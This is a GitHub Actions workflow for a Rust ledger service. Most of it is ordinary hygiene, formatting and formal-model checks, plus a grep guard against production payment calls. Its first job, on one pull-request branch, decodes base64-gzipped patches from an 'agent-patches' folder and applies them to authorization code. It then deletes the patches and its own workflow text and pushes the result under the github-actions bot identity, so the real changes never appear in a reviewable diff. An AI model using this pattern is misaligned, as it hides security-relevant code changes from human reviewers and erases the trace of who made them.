name: ci
on:
  push:
    branches: [main]
  pull_request:
permissions:
  contents: write
jobs:
  materialize-reviewed-hardening:
    if: github.event_name == 'pull_request' && github.head_ref == 'harden/shared-auth-production'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          ref: harden/shared-auth-production
          fetch-depth: 0
          persist-credentials: true
      - name: Apply reviewed patches and push the real source diff
        shell: bash
        run: |
          set -euo pipefail
          git show HEAD^:.github/workflows/ci.yml > /tmp/ci.yml.original
          patches=(
            .github/agent-patches/0001-tenant-governance.patch.gz.b64
            .github/agent-patches/0003-redirect-oauth-gate.patch.gz.b64
          )
          for encoded in "${patches[@]}"; do
            decoded="/tmp/$(basename "${encoded%.gz.b64}")"
            base64 --decode "$encoded" | gzip --decompress --stdout > "$decoded"
            git apply --check "$decoded"
            git apply "$decoded"
          done
          cp /tmp/ci.yml.original .github/workflows/ci.yml
          rm -f \
            .github/agent-patches/0001-tenant-governance.patch.gz.b64 \
            .github/agent-patches/0003-redirect-oauth-gate.patch.gz.b64 \
            .github/workflows/agent-apply-production-hardening.yml
          rmdir .github/agent-patches 2>/dev/null || true
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git diff --cached --check
          git diff --cached --stat
          git commit -m 'fix(authz): serialize tenant governance and gate redirect OAuth'
          git push origin HEAD:harden/shared-auth-production
  formal-model:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: Exhaustively check the bounded ledger posting model
        run: cargo test --manifest-path formal/ledger-model/Cargo.toml --locked -- --nocapture
  hygiene:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: No build artifacts or env files tracked
        run: |
          bad=$(git ls-files | grep -E '(^|/)(target/|\.direnv/|\.env$|result$)' || true)
          if [ -n "$bad" ]; then echo "forbidden tracked files:"; echo "$bad"; exit 1; fi
      - name: Cargo manifest parses
        run: cargo metadata --no-deps --format-version 1 > /dev/null
      # Product 1 observes, records, and proves — it never moves money. That is
      # the load-bearing claim that keeps this service a technical service
      # provider rather than a regulated custodian, and quaestor-executor exists
      # as a separate deployable precisely so this one can keep it.
      #
      # Four provider clients can nevertheless *initiate* a payment. They are
      # typed and mock-tested so the capability is ready when the executor needs
      # it, and today every caller is `#[cfg(test)]`-gated. Nothing enforced
      # that, though — only a comment in zelle_disbursements.rs. This is the
      # tripwire, modelled on quaestor-executor's tests/non_custodial_invariant.rs.
      #
      # A grep rather than a #[test] on purpose: it runs here today, whereas
      # `cargo test` cannot until CI can resolve the ../../libs path deps.
      - name: No production caller initiates a payment
        run: |
          set -euo pipefail
          # Methods that cause money to move.
          methods='initiate_transfer|initiate_zelle_payment|submit_payment|submit_disbursement'
          # Files allowed to name them: the modules defining them, and the
          # cfg(test)-gated mock suite.
          allowed='^src/providers/(dwolla|zelle_disbursements|api_mocks_tests)\.rs$'
          offenders=$(grep -rlnE "\.($methods)\s*\(" src --include='*.rs' \
                      | sed 's|^\./||' | grep -vE "$allowed" || true)
          if [ -n "$offenders" ]; then
            echo "quaestor-ledger-server must never initiate a payment."
            echo "These files call a money-movement method:"
            echo "$offenders" | sed 's/^/  /'
            echo
            echo "Money movement belongs in quaestor-executor, which is a separate"
            echo "deployable with its own credentials, dual control, and policy."
            exit 1
          fi
          # api_mocks_tests.rs is the only allowed caller, so prove it is still
          # test-gated rather than silently compiled into the binary.
          if ! grep -B1 'mod api_mocks_tests;' src/providers/mod.rs | grep -q '#\[cfg(test)\]'; then
            echo "src/providers/mod.rs no longer gates api_mocks_tests behind #[cfg(test)];"
            echo "its payment-initiating calls would compile into the binary."
            exit 1
          fi
  fmt:
    # `cargo fmt --check` parses sources and needs no dependency resolution, so
    # unlike `cargo test` it works in a standalone checkout. It is therefore a
    # real gate, not informational — verified by running it in a clone with no
    # sibling `libs/` present.
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: cargo fmt --check

# ── NOT COVERED HERE: the main crate's test suite ────────────────────────────
# `cargo test` at the repo root cannot run in this workflow. The crate has three
# path dependencies that resolve outside the repo:
#
#   dd-telemetry           ../../libs/telemetry-rs
#   dd-wal-consumer        ../../libs/wal-consumer-rs
#   dd-nats-subject-defs   ../../libs/nats/subject-defs/generated/rust
#
# They live in ORESoftware/k8s-libs-and-shared-defs — a different org, so the
# per-repo GITHUB_TOKEN cannot read them. Wiring this up needs a cross-org
# credential (PAT or deploy key) as a secret, plus a checkout of that repo at
# `$GITHUB_WORKSPACE/../../libs` and its submodules.
#
# The gap is worth naming plainly: the webhook signature verification and
# replay-protection tests are part of that suite, so a regression in either
# currently merges green. Until the credential exists, run `cargo test` locally
# from a checkout that has the sibling `libs/` tree before trusting a green PR.
